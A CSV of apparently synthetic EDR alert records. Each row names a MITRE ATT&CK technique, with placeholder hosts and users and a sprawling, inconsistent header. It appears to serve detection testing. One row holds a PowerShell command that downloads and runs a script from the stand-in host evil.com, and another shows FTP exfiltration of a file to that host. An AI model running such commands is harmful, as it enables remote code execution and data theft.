AlertID,creationTimeUtc,AlertTimestamp,severity,category,status,AlertName,AlertDescription,recommendedActions,vendorInformation,properties,AlertCategory,AlertSeverity,Technique,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,ProcessCommandLine,DetectionMethod,RecommendedActions,source,tactic,device_name,action,file_name,file_size,src_path,dst_path,Severity,Name,Event,AlertType,MachineId,Category,AlertId,EventTime,ExtendedProperties,ComputerName,Status,AlertDetails,EndpointDetails,DetectionSource,DetectionID,EventHash,AffectedEntities,Tactic,KillChainPhase,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,hostname,ip_address,os,pid,command_line,access_type,operation,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessName,ParentProcessCommandLine,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,EntityType,EntityName,OS,References,KillChain,MachineDomainName,MachineName,AlertLink,Recommendation,Vendor,Product,Path,Hash,Protocol,SourceIp,SourcePort,DestinationIp,DestinationPort,DomainName,URL,Type,EndpointID,EndpointName,ParentProcessPath,ProcessPath,Source,Host,User,Target,Port,Action,Reason,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,TargetUser,OriginalPermissions,NewPermissions,Field,Operator,Value,Tags,InjectedProcessName,InjectionTechnique,ControlName,sha1_hash,file_path,process_name,process_path,HostIP,AdditionalInfo,RegistryKey,RegistryValue,CloudProvider,APIOperation,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,ProcessHash,Hostname,SourceIP,DestinationIP,AttackType,AttackDuration,AffectedServices,AffectedHostname,AlertSource,alert_severity,action_taken,detection_source,Affected_Hostname,Injected_Process_Name,Parent_Process_Name,Injection_Technique,Alert_Source,machine_id,user_id,process_id,process_command_line,alert_type,alert_name,remote_address,remote_port,local_address,local_port,protocol,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,IP,OSVersion,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,ParentCommandLine,EventID,ParentHash,ExecutionStatus,EntityValue,Condition,Description,Endpoint,RemediationSteps,EventId,ProcessId,CloudAccount,local_ip,public_ip,detection_method,file_hash,malware_family,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,AttackTactic,AttackTechnique,EntityId,EntityIp,Details,TimestampUtc,SHA256,WebServiceName,WebServicePath,type,vendor,path,domain,host,Affected_Device,Affected_User,Malicious_Executable,Username,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentName,ProcessParentID,ArtifactType,ArtifactPath,ArtifactName,AleertDescription,AlertTimestamps,native_function_calls,source_ip,destination_ip,process_hash,parent_process_name,parent_process_hash,Detection_Details,Process_Path,Process_Command_Line,AffectedFile_Path,AlertTime,UserInfo,PhishingInfo,AffectedImagePath,AffectedEndpoints,IndicatorsOfCompromise,Loader_Process_Name,Loader_Technique,ProcessParentPath,ProcessParentHash,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,MACAddress,AlertyDescription,EventLogName,EventLogMessage,OperatingSystem,FallbackProtocol,Alertescription,modified_time,original_hash,current_hash,RemoteServer,affected_host,alert_category,alert_recommendation,alert_details,RuleName,ProcessParentCommandLine,AttackVector,AlertTimestampUtc,WebServerUrl,WebServerMethod,technique,remote_ip,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName
445566778888,,2023-03-10T14:30:00.000Z,,,,Build Image on Host Detected,The endpoint has detected an attempt to build an image on the host system. This behavior is consistent with the MITRE ATT&CK technique T1612.,,,,Endpoint Detection and Response,,,,,,,,"""C:\Program Files\Docker\Docker\Docker Desktop.exe""",,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,docker,,,,192.168.1.100,,1234,5678,,,,,,,,,,,,,powershell.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\Docker\Docker\Docker Desktop.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ExampleHost01,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Build Image on Host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,JohnDoe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
099909,,2022-03-09T09:30:00.0000000Z,,,,Data Manipulation,Suspicious data manipulation activity was detected on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,2,,,Behavior,12345,Suspicious,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Data Manipulation', 'AlertId': '12345', 'ThreatName': 'Data Manipulation', 'Severity': 'Medium', 'TimestampUtc': '2022-03-09T09:30:00.0000000Z', 'MITRE': {'Tactic': ['Defense Evasion'], 'Technique': [{'Id': 'T1565', 'Name': 'Data Manipulation'}]}, 'AffectedEntities': {'Process': [{'ProcessId': 1234, 'ProcessCommandLine': 'C:\\Program Files\\example-app\\example-app.exe', 'ProcessStartTimeUtc': '2022-03-09T09:00:00.0000000Z', 'ProcessParentCommandLine': 'C:\\Windows\\system32\\cmd.exe /c start C:\\Program Files\\example-app\\example-app.exe', 'ProcessParentImageFileName': 'cmd.exe', 'ProcessGrandparentCommandLine': 'C:\\Windows\\system32\\cmd.exe /c start C:\\Program Files\\example-app\\example-app.exe', 'ProcessGrandparentImageFileName': 'cmd.exe'}], 'File': [{'FilePath': 'C:\\Windows\\Temp\\example-file.txt', 'FileName': 'example-file.txt', 'CreateTimeUtc': '2022-03-09T09:15:00.0000000Z', 'ModifyTimeUtc': '2022-03-09T09:20:00.0000000Z', 'SHA256Hash': 'ABC123...'}]}}",example-hostname,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0303345,,2022-04-05T08:32:15Z,,,,deployment of unauthorized container on host,This alert is triggered when an attempt to deploy an unauthorized container is detected on a host.,,,,Container Security,,Deploy Container,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,Host01,/usr/bin/docker,,docker run -itd unauthorized-image:latest,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,john.doe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,unauthorized-image:latest,Docker,docker run,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
99909090,,2023-03-10T12:00:00Z,,,,Execution Guardrails,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,John.Doe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversarys campaign.,ABC123,Workstation-01,192.168.1.100,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0009090,,2023-03-08T14:30:00Z,,,,Exfiltration Over C2 Channel Detected,This alert is triggered when data exfiltration is detected over a Command and Control (C2) channel on an endpoint.,,,,,,,,,,,,powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'),,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,powershell.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,evil.com,SensitiveData.txt,HTTP,DOMAIN,explorer.exe,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
00030505,,2023-03-08T14:30:00Z,,,,Exfiltration Over Other Network Medium,This alert is triggered when data exfiltration is detected over an alternative network medium on an endpoint.,,,,,,,,,,,,explorer.exe ftp://evil.com/SensitiveData.txt,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,SensitiveData.txt,FTP,DOMAIN,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
oeoro5555,,2023-03-08T14:30:00Z,,,,Exfiltration Over Physical Medium ,This alert is triggered when data exfiltration is detected over a physical medium on an endpoint.,,,,,,,,,,,,explorer.exe copy SensitiveData.txt E:\,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,SensitiveData.txt,USB,DOMAIN,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ldsjfjg90,,2023-03-10T14:00:00Z,,,,Hide Artifacts,Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.,,,,,,Hide Artifacts,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,explorer.exe,,,,,,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin,,,Blocked,Attempt to hide malware file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,File,C:\Windows\system32\cmd.exe,malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
234567,,2022-04-05T13:45:00Z,,,,Inter-Process Communication,,,,,,,,,,,,,,,"['Terminate the suspicious processes.', 'Review and block any network traffic associated with these processes.', 'Perform a full system scan to ensure no other malicious processes are running on the system.']",,,,,,,,,High,,,,,,,,,,,"Detected suspicious inter-process communication between Process A and Process B. Process A, a known trusted process, was found communicating with Process B, a command line tool. This is indicative of possible defense evasion and command and control activity. Further investigation is recommended.",,Defender for Endpoint EDR,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MDE-78901,,,Medium,,,Native OS Functions,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2022-10-31T15:43:21Z,"['NtOpenFile', 'NtCreateFile', 'NtReadFile']",192.168.1.151,192.168.1.150,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-34567,,,High,,,Masked Executable,Masked executable detected on host COMPUTER-123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe /c C:\Users\user\Downloads\example.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Users\user\Downloads\example.exe,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5d41402abc4b2a76b9719d911017c592,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2022-10-31T00:12:34Z,,,,8ce9eaf907aedfcdff2c0a4d77a4c1f0,explorer.exe,e57597d202f73c0f6a4057f3d1a784b7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
6384095-,,2023-03-10T19:00:00Z,,,,Masquerade as a Legitimate Application,"Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.",,,,,,Masquerade as a Legitimate Application,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,explorer.exe,explorer.exe /c C:\Windows\system32\notepad.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Process attempted to execute an unauthorized file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0304950,,2023-03-10T20:00:00Z,,,,Modify Registry,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.",,,,,,Modify Registry,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,desktop01,user01,,,Blocked,Unauthorized modification of registry key,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0902405,,2023-03-09T12:00:00.000000Z,,,,Multi-Stage Command and Control,Detection of multi-stage command and control traffic,,,,,,,,,,,,C:\Windows\System32\svchost.exe -k netsvcs,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,svchost.exe,,,,,,1234,5678,,,,,,,,,,,,,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,TCP,,,,443,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
pr4p5-f,,,,,,Native API,Defender for Endpoint has detected suspicious use of a Native API on the system.,,,,,,Native API (T1106),,,,,,,,,,,,,,,,,High,,,,,System Call,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Analyze the system for any suspicious activities or processes and block the process that was making the suspicious call.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,"Defender for Endpoint detected a process using a Native API function to interact with the operating system. The API function is commonly used by malware to execute commands or perform actions on the system, and can be an indicator of malicious activity.",C:\Windows\explorer.exe,"explorer.exe /root,C:\Windows\system32",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30340ed0r5,,2023-03-09T12:00:00.000000Z,,,,Non-Application Layer Protocol,Detection of non-application layer protocol traffic,,,,,,,,,,,,C:\Windows\System32\nslookup.exe example.com,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,nslookup.exe,,,,,,1234,5678,,,,,,,,,,,,,cmd.exe,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,,,,,UDP,,,,53,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
203040fd,,2023-03-09T12:00:00.000000Z,,,,Non-Standard Port,Detection of network traffic to a non-standard port,,,,,,,,,,,,C:\Program Files\curl\curl.exe https://example.com:12345,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,curl.exe,,,,,,1234,,,,,,,,,,,,,,cmd.exe,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,,,,,TCP,,,,12345,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0304054d,,2023-03-10T10:30:00Z,,,,Obfuscated Files,Adversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter.,,,,,,Obfuscated Files or Information,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Program Files\Malware\malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
T1566,,,,,,Potential Phishing Attempt,An email was received with suspicious content and links. The user did not click on any links or respond to the email.,,,,,,,,,,,,,,,,,,,,,,,High,,,Phishing,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-04T13:45:30Z,"{'UserName': 'johndoe', 'UserDisplayName': 'John Doe', 'UserEmail': 'johndoe@example.com', 'UserAgent': 'Microsoft Outlook', 'UserIP': '192.168.1.20'}","{'SenderEmail': 'spoofed@example.com', 'RecipientEmail': 'johndoe@example.com', 'Subject': 'Important: Action Required', 'URLs': ['http://malicious.com', 'http://phishing.com'], 'Attachments': ['invoice.pdf']}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3-04-5-ft5,,2023-03-10T12:00:00Z,,,,Pre-OS Boot,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system.",,,,,,Pre-OS Boot,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Persistence,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the pre-OS boot image to determine the nature and purpose of the modification.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\bootmgr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
toeodo56,,2023-03-09T15:30:00Z,,,,Protocol Tunneling,Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another.,,,,,,,,,,,,,Network traffic analysis,"['Isolate affected endpoints', 'Investigate network traffic']",,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Protocol: HTTP over DNS,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Endpoint1', 'Endpoint2']","['192.168.1.10', '10.0.0.2']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33440rft,,2023-03-10T15:45:00Z,,,,Reflective Code,.,,,,,,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk",,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the injected process and loader process to determine the nature and purpose of the reflective code loading activity and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,explorer.exe,,,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,notepad.exe,Reflective DLL Injection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
